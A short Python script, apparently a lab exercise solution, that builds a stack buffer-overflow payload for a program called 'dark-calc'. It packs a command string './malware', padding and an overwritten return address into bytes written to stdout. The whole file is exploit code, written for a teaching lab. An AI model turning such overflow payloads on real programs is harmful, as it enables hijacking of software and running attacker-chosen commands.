#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
import struct
command = b'./malware\x00'
padding = b'A' * (24 - len(command))
target = struct.pack('<Q', 0x401a6b)
payload = command + padding + target
sys.stdout.buffer.write(payload)
